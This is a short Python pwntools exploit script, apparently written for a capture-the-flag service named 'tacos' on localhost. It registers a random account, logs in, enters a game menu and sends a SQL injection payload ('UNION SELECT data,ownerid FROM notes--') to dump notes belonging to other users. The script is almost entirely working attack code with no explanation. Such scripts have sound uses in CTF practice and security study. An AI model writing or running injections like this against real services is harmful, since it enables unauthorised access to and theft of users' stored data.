from pwn import *
from string import ascii_uppercase, ascii_lowercase, digits

def generate_string(min_length: int = 8,
                    max_length: int = 16,
                    alphabet: str = ascii_lowercase + ascii_uppercase + digits) -> str:
    symbols = random.choices(alphabet, k=random.randint(min_length, max_length))
    return "".join(symbols)

def register(username: str, password: str) -> None:
    io.recvuntil(b"anon@tacos> ")
    io.sendline(b"register")

    io.recvuntil(b": ")
    io.sendline(username.encode())

    io.recvuntil(b": ")
    io.sendline(password.encode())

def login(username: str, password: str) -> None:
    io.recvuntil(b"anon@tacos> ")
    io.sendline(b"login")

    io.recvuntil(b": ")
    io.sendline(username.encode())

    io.recvuntil(b": ")
    io.sendline(password.encode())

def login_user() -> None:
    io.recvuntil(b"$ ")
    io.sendline(b"1")
    io.recvuntil(b": ")
    io.sendline(b"user")
    io.recvuntil(b": ")
    io.sendline(b"resu")

io = remote("127.0.0.1", 1488)

username = generate_string(8, 12)
password = generate_string(8, 12)

register(username, password)
login(username, password)

io.recvuntil(b"@tacos> ")
io.sendline(b"game")

io.recvuntil(b"q - quit the game\n")
io.sendline(b"l")

io.recvline()
io.sendline(b"'UNION SELECT data,ownerid FROM notes--")

print(io.recvuntil(b"Red or Black game\n").decode(), flush=True)

io.interactive()